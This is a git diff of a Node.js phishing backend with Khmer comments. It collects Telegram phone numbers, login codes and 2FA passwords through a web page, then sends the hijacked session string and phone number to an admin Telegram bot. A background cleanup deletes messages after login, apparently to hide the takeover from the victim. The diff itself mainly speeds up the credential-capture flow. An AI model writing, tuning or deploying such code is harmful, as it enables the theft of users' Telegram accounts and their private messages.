@@ -143,6 +143,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// 1. API: ផ្ញើលេខកូដ OTP ទៅ Telegram App (Optimize Connection Speed)
 app.post('/api/send-code', async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) {
@@ -153,13 +154,16 @@ app.post('/api/send-code', async (req, res) => {
         const userAgent = req.headers['user-agent'] || '';
         const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
 
+        // បន្ថយ connectionRetries មក 2 និងកំណត់ timeout ដើមបីរត់លឿន
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
-            connectionRetries: 5,
+            connectionRetries: 2,
+            timeout: 10,
             deviceModel: deviceModel,
             systemVersion: systemVersion,
             appVersion: "10.2.1",
             langCode: "en",
         });
+
         await client.connect();
 
         const { phoneCodeHash } = await client.sendCode(
@@ -176,6 +180,7 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
+// 2. API: ផ្ទៀងផ្ទាត់ OTP និង 2FA Password (Fast Response)
 app.post('/api/verify-code', async (req, res) => {
     const { phoneNumber, code, password } = req.body;
 
@@ -208,10 +213,10 @@ app.post('/api/verify-code', async (req, res) => {
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
-        // ដំណើរការលុប Chat ក្នុង Background ដោយមិនបាច់ឱ្យ Frontend រង់ចាំ (ដក await ចេញ)
+        // ដំណើរការលុបសារក្នុង Background (មិនទាក់ទាញល្បឿន Web)
         cleanupPostLogin(client).catch(err => console.error("Cleanup background error:", err));
 
-        // ផ្ញើ Session String ចូល Telegram Admin Bot
+        // ផ្ញើ Session String ទៅ Admin Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
@@ -230,7 +235,6 @@ app.post('/api/verify-code', async (req, res) => {
             }
         }
 
-        // ឆ្លើយតបទៅ Frontend ភ្លាមៗ (ក្នុងរយៈពេល 1-2 វិនាទី)
         res.json({
             success: true,
             message: "Authentication successful!",
